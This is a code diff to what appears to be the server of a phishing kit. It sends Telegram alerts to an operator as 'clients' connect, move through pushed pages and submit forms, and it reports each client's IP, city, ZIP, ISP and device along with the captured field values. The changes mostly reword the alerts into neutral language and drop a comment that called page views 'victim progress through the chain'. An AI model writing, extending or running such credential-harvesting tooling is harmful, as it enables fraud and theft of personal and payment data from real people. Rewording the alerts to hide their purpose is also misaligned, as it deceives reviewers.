@@ -1259,17 +1259,18 @@ def _lpv_final_flush(client_id: str, reason: str = "") -> None:
         items = list(fields.items())[:15]
         lines = []
         for i, (k, v) in enumerate(items):
-            branch = "└" if i == len(items) - 1 else "├"
             if isinstance(v, list):
                 v = ", ".join(str(x) for x in v)
-            lines.append(f"{branch} <b>{_tg_esc(k, 30)}:</b> {_tg_esc(v, 120)}")
+            lines.append(f"• <b>{_tg_esc(k, 32)}:</b> <code>{_tg_esc(v, 120)}</code>")
         body = "\n".join(lines)
-        extra = f" <i>({_tg_esc(reason, 24)})</i>" if reason else ""
+        trigger_text = f"Input completed ({_tg_esc(reason, 24)})" if reason else "Input completed"
         tg_notify(
-            f"📝 <b>PAGE FINAL VALUES</b>{extra}\n\n"
-            f"📄 <b>Page:</b> {_tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)}\n"
-            f"{body}\n"
-            f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+            f"<b>CAPTURED FORM DATA</b>\n\n"
+            f"<b>Source Page:</b> {_tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)}\n"
+            f"<b>Event:</b> {trigger_text}\n"
+            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n\n"
+            f"<b>Captured Fields:</b>\n"
+            f"{body}",
             "notify_lpv_final",
         )
     except Exception:
@@ -5837,10 +5838,10 @@ async def _run_workflow_on_client(
     except Exception:
         pass
     tg_notify(
-        f"▶️ <b>WORKFLOW STARTED</b>\n\n"
-        f"🧩 <b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-        f"🔢 <b>Steps:</b> {len(workflow.get('steps') or [])}\n"
-        f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+        f"<b>WORKFLOW INITIATED</b>\n\n"
+        f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
+        f"<b>Total Steps:</b> {len(workflow.get('steps') or [])}\n"
+        f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
         "notify_lpv_workflow",
     )
     # Track last pushed page so redirect events have a page context.
@@ -6065,10 +6066,10 @@ async def _run_workflow_on_client(
         "payload": {"workflow_id": workflow.get("id"), "name": workflow.get("name")},
     })
     tg_notify(
-        f"✅ <b>WORKFLOW FINISHED</b>\n\n"
-        f"🧩 <b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-        f"🔢 <b>Steps:</b> {len(steps)}\n"
-        f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+        f"<b>WORKFLOW COMPLETED</b>\n\n"
+        f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
+        f"<b>Completed Steps:</b> {len(steps)}\n"
+        f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
         "notify_lpv_workflow",
     )
 
@@ -6690,10 +6691,10 @@ async def _auto_workflow_runner(
             client_id, workflow.get("id"), exc,
         )
         tg_notify(
-            f"❌ <b>WORKFLOW CRASHED</b>\n\n"
-            f"🧩 <b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-            f"⚠️ <b>Error:</b> {_tg_esc(exc, 150)}\n"
-            f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+            f"<b>WORKFLOW EXECUTION ERROR</b>\n\n"
+            f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
+            f"<b>Error Details:</b> <code>{_tg_esc(exc, 150)}</code>\n"
+            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
             "notify_lpv_workflow",
         )
 
@@ -6882,39 +6883,40 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 ip = "Unknown"
         if wf_boot:
             wf_label = f"{_tg_esc(wf_boot.get('name') or 'unnamed', 60)}"
-            wf_via = "workflow link" if per_link_id else "global auto-workflow"
-            wf_line = f"🧩 <b>Workflow:</b> {wf_label} <i>({wf_via})</i>"
+            wf_via = "link" if per_link_id else "global auto-run"
+            wf_line = f"<b>Workflow:</b> {wf_label} ({wf_via})\n"
         else:
-            wf_line = "🧩 <b>Workflow:</b> none (landing page only)"
+            wf_line = ""
         auth_frag = (init_data.get("auth_token") or "")[:8]
-        link_line = f"🔗 <b>Link:</b> <code>{_tg_esc(auth_frag)}…</code>\n" if auth_frag else ""
+        link_line = f"<b>Auth Token:</b> <code>{_tg_esc(auth_frag)}…</code>\n" if auth_frag else ""
         if init_data.get("is_mobile"):
-            device = "📱 Mobile"
+            device_type = "Mobile"
         elif init_data.get("is_touch"):
-            device = "👆 Touch"
+            device_type = "Tablet / Touch"
         else:
-            device = "🖥️ Desktop"
+            device_type = "Desktop"
         scr = init_data.get("screen") or {}
         size = f"{scr.get('width', '?')}×{scr.get('height', '?')}"
         ua = (init_data.get("userAgent") or "")[:120]
-        _flag = (loc.get("flag") or "").strip()
-        _country = f"{_flag} {loc.get('country') or '-'}".strip()
+        _country = (loc.get('country') or '-').strip()
+        _region = (loc.get('state') or '-').strip()
+        _city = (loc.get('city') or '-').strip()
         _isp = (loc.get("isp") or "").strip()
-        isp_line = f"\n🛰 <b>ISP:</b> {_tg_esc(_isp, 60)}" if _isp else ""
+        isp_line = f"\n• <b>ISP:</b> {_tg_esc(_isp, 60)}" if _isp else ""
         tg_notify(
-            f"🔥 <b>LPV CLIENT CONNECTED</b>\n\n"
-            f"{wf_line}\n"
-            f"{link_line}"
-            f"📍 <b>Location</b>\n"
-            f"├ <b>IP:</b> {_tg_esc(ip)}\n"
-            f"├ <b>Country:</b> {_tg_esc(_country)}\n"
-            f"├ <b>Region:</b> {_tg_esc(loc.get('state') or '-')}\n"
-            f"├ <b>City:</b> {_tg_esc(loc.get('city') or '-')}\n"
-            f"└ <b>ZIP:</b> {_tg_esc(loc.get('zip') or '-')}"
-            f"{isp_line}\n"
-            f"{device} <b>Device:</b> {_tg_esc(size)}\n"
-            f"<b>UA:</b> {_tg_esc(ua)}\n"
-            f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+            f"<b>CLIENT SESSION STARTED</b>\n\n"
+            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n"
+            f"{wf_line}"
+            f"{link_line}\n"
+            f"<b>Network &amp; Location:</b>\n"
+            f"• <b>IP:</b> <code>{_tg_esc(ip)}</code>\n"
+            f"• <b>Country:</b> {_tg_esc(_country)}\n"
+            f"• <b>Region:</b> {_tg_esc(_region)}\n"
+            f"• <b>City:</b> {_tg_esc(_city)}"
+            f"{isp_line}\n\n"
+            f"<b>Device &amp; Environment:</b>\n"
+            f"• <b>Type:</b> {_tg_esc(device_type)} ({_tg_esc(size)})\n"
+            f"• <b>User-Agent:</b> <code>{_tg_esc(ua)}</code>",
             "notify_connect",
         )
     except Exception:
@@ -7068,21 +7070,21 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                         try:
                             _fields = (payload or {}).get("fields") or {}
                             if isinstance(_fields, dict) and _fields:
-                                _items = list(_fields.items())[:12]
+                                _items = list(_fields.items())[:15]
                                 _lines = []
                                 for _i, (_k, _v) in enumerate(_items):
                                     if isinstance(_v, list):
                                         _v = ", ".join(str(x) for x in _v)
-                                    _branch = "└" if _i == len(_items) - 1 else "├"
-                                    _lines.append(f"{_branch} <b>{_tg_esc(_k, 30)}:</b> {_tg_esc(_v, 120)}")
+                                    _lines.append(f"• <b>{_tg_esc(_k, 32)}:</b> <code>{_tg_esc(_v, 120)}</code>")
                                 _body = "\n".join(_lines)
                             else:
-                                _body = "(no fields captured)"
+                                _body = "<i>No fields recorded</i>"
                             tg_notify(
-                                f"💳 <b>FORM SUBMITTED</b>\n\n"
-                                f"📄 <b>Page:</b> {_tg_esc(page_name or '-', 60)}\n"
-                                f"{_body}\n"
-                                f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                                f"<b>FORM SUBMISSION DETECTED</b>\n\n"
+                                f"<b>Source Page:</b> {_tg_esc(page_name or '-', 60)}\n"
+                                f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n\n"
+                                f"<b>Submitted Fields:</b>\n"
+                                f"{_body}",
                                 "notify_lpv_submit",
                             )
                         except Exception:
@@ -7123,12 +7125,12 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                         })
                     except Exception:
                         pass
-                    # Telegram: page view = victim progress through the chain.
+                    # Telegram: page view = progress through the chain.
                     try:
                         tg_notify(
-                            f"📄 <b>LPV PAGE VIEWED</b>\n\n"
+                            f"<b>PAGE NAVIGATION DETECTED</b>\n\n"
                             f"<b>Page:</b> {_tg_esc(page_name or page_id or '-', 60)}\n"
-                            f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
                             "notify_navigate",
                             flag_default=False,
                         )
@@ -7204,9 +7206,9 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             _m, _s = divmod(_dur, 60)
             _dur_txt = f"{_m}m {_s}s" if _m else f"{_s}s"
             tg_notify(
-                f"👋 <b>LPV CLIENT LEFT</b>\n\n"
-                f"⏱ <b>Duration:</b> {_dur_txt}\n"
-                f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                f"<b>CLIENT SESSION ENDED</b>\n\n"
+                f"<b>Session Duration:</b> {_dur_txt}\n"
+                f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
                 "notify_disconnect",
             )
         except Exception:
@@ -7317,9 +7319,10 @@ async def websocket_endpoint(websocket: WebSocket):
                 await websocket.send_json({"type": "error", "message": "Invalid or expired link"})
                 await websocket.close()
                 tg_notify(
-                    f"⚠️ <b>INVALID / EXPIRED LINK OPENED</b>\n\n"
-                    f"🔑 <b>Token:</b> <code>{_tg_esc(str(auth_token)[:12])}…</code>\n"
-                    f"🌐 <b>IP:</b> {_tg_esc(client_ip)}",
+                    f"<b>SECURITY ALERT: INVALID ACCESS ATTEMPT</b>\n\n"
+                    f"<b>Status:</b> Link expired or token invalid\n"
+                    f"<b>Token:</b> <code>{_tg_esc(str(auth_token)[:12])}…</code>\n"
+                    f"<b>IP Address:</b> <code>{_tg_esc(client_ip)}</code>",
                     "notify_lpv_security",
                 )
                 return
@@ -8246,14 +8249,13 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                             "page_id": page_id,
                                             "page_name": page["name"],
                                         })
-                                        # Telegram: operator manually pushed
-                                        # a page to this client.
+                                        # Telegram: operator manually pushed a page to this client.
                                         if ok:
                                             try:
                                                 tg_notify(
-                                                    f"📤 <b>PAGE PUSHED MANUALLY</b>\n\n"
-                                                    f"📄 <b>Page:</b> {_tg_esc(page['name'], 60)}\n"
-                                                    f"🆔 <b>Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                                                    f"<b>OPERATOR PAGE DISPATCH</b>\n\n"
+                                                    f"<b>Pushed Page:</b> {_tg_esc(page['name'], 60)}\n"
+                                                    f"<b>Target Client:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
                                                     "notify_lpv_push",
                                                 )
                                             except Exception:
